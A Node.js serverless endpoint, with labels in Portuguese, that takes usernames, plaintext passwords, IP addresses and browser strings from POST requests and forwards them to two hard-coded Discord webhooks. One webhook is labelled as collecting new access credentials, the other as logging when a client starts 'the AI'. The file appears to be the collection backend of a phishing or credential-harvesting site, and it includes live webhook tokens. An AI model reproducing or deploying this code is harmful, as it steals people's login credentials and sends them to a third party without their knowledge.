const axios = require('axios');

const WEBHOOKS = {
  logins: "https://discord.com/api/webhooks/1484176339207454911/VBl5RHQhvsDEBI-51tplBAnzXjouHcw0osr_-P1aaJL1LTtGQJMiA3uOjp8AK2a-cRqO",
  ativos: "https://discord.com/api/webhooks/1484174893355368589/FjlMLTOlHDtC2_QCt0ohUPDLQ5XeITXVDxXLxjjrWqWT0sNqwQc32ypnvmBiz9gAqa0k"
};

async function sendLog(type, embed) {
  const url = WEBHOOKS[type];
  if (!url) return;
  try {
    await axios.post(url, { embeds: [embed] });
  } catch (e) {
    console.error(`Erro ao enviar log ${type}:`, e.message);
  }
}

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { username, password, ip, type, userAgent } = req.body;

  if (type === 'login') {
    await sendLog('logins', {
      title: "🔐 Nova Credencial de Acesso (Web)",
      color: 0xff00ff,
      fields: [
        { name: "👤 Usuário Escolhido", value: username || "Não informado", inline: true },
        { name: "🔑 Senha", value: password || "Não informado", inline: true },
        { name: "📍 IP", value: ip || "Desconhecido" },
        { name: "🌐 Navegador", value: userAgent || "Desconhecido" }
      ],
      timestamp: new Date()
    });
  } else if (type === 'active') {
    await sendLog('ativos', {
      title: "🟢 Cliente Iniciou a IA (Web)",
      color: 0x0000ff,
      fields: [
        { name: "📍 IP", value: ip || "Desconhecido" },
        { name: "🌐 Navegador", value: userAgent || "Desconhecido" }
      ],
      timestamp: new Date()
    });
  }

  return res.status(200).json({ success: true });
};
